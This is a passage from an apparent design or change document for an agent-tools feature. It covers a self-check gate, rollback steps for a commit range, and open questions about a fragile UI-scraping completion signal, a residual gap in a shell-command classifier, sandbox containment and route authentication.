   `systemd/meta-api.service.d/paciencia-agente.conf` budget settings.
3. **Verify the gate**: the first `POST /v1/agent` runs `selfCheck()`; a broken posture
   returns `503` and starts nothing.

Rollback: the change is contained on branch `feat/agent-tools` and not merged to `main`.
Revert the commit range `db4a1e8..40558a2`; `server.mjs` is the only pre-existing file with
substantial changes and reverts cleanly. Do not restart the live broker while measurement
round 3 is running — roll back on disk only, after the round ends.

## Open Questions

- [ ] Can the completion semaphore be made less fragile than scraping the action bar (e.g. a
      stable streaming endpoint or a DOM contract Meta will not silently change)? Currently
      accepted as inherently fragile.
- [ ] Should the residual classifier indirection vector be eliminated with a real shell AST
      parser, or is `:ro` + `--network none` containment the intended permanent posture?
- [ ] Should recovered agent jobs checkpoint the loop so a restart resumes from the last step
      instead of replaying the mission from the first turn?
- [ ] Should the agent route eventually gain authentication before any non-localhost
      deployment, or remain localhost-only by design?
